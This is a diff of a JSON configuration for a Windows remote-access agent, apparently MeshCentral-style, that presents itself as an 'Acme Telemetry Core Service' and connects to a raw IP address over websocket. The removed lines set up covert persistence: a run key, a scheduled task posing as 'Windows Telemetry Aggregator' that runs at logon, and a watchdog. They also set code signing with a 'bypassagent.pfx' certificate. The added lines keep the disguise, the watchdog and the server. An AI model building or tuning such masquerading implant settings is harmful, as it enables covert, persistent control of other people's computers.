@@ -9,11 +9,9 @@
     "description": "Acme Telemetry Core Service",
     "installRoot": "C:/ProgramData/Acme/TelemetryCore",
     "logPath": "C:/ProgramData/Acme/TelemetryCore/logs",
-    "icon": null,
     "versionInfo": {
       "fileVersion": "1.0.0.0",
-      "productVersion": "1.0.0.0",
-      "originalFilename": "AcmeTelemetryCore.exe"
+      "productVersion": "1.0.0.0"
     }
   },
   "network": {
@@ -22,9 +20,7 @@
     "hostHeader": null,
     "alpn": ["http/1.1"],
     "userAgent": "AcmeAgent/1.0",
-    "ja3": null,
-    "useIpOnly": true,
-    "proxy": { "host": "127.0.0.1", "port": 8080, "scheme": "http" }
+    "useIpOnly": true
   },
   "artifacts": {
     "databaseName": "telemetry.db",
@@ -32,29 +28,16 @@
     "configFileName": "telemetry.conf"
   },
   "persistence": {
-    "runKey": true,
-    "scheduledTask": {
-      "enabled": true,
-      "name": "Windows Telemetry Aggregator",
-      "trigger": "onlogon"
-    },
-    "wmi": {
-      "enabled": false
-    },
-    "watchdog": {
-      "enabled": true,
-      "intervalSeconds": 300
-    }
-  },
-  "signing": {
-    "certificatePath": "C:/certs/bypassagent.pfx",
-    "timestampUrl": "http://timestamp.digicert.com"
+    "runKey": false,
+    "scheduledTask": { "enabled": false },
+    "wmi": { "enabled": false },
+    "watchdog": { "enabled": true, "intervalSeconds": 600 }
   },
   "provisioning": {
     "meshName": "Acme Telemetry",
     "meshType": "2",
-    "meshId": "0xEDBE1BE...",
-    "serverId": "0x0123456789ABCDEF...",
+    "meshId": "",
+    "serverId": "",
     "serverUrl": "wss://72.60.233.29:443/agent.ashx"
   }
 }
